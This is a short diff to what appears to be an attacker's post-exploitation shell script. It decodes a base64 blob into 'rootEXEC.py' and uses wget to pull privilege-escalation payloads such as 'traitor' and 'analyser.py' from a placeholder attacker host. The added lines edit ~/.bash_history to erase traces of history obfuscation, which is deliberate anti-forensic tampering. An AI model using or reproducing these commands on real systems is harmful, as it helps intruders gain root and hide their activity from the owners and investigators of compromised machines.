@@ -14,6 +14,8 @@ echo $py | base64 -d | cat > ./rootEXEC.py
 
 wget http://<REPLACE_IP>:10000/payloads/traitor-386 -O ./traitor
 
+# remove evidence of history obfuscation from bash history
+sed -i '/HISTCONTROL=ignorespace/d' ~/.bash_history
 
 # Payloads
 wget http://<REPLACE_IP>:10000/payloads/analyser.py -O ./analyser.py
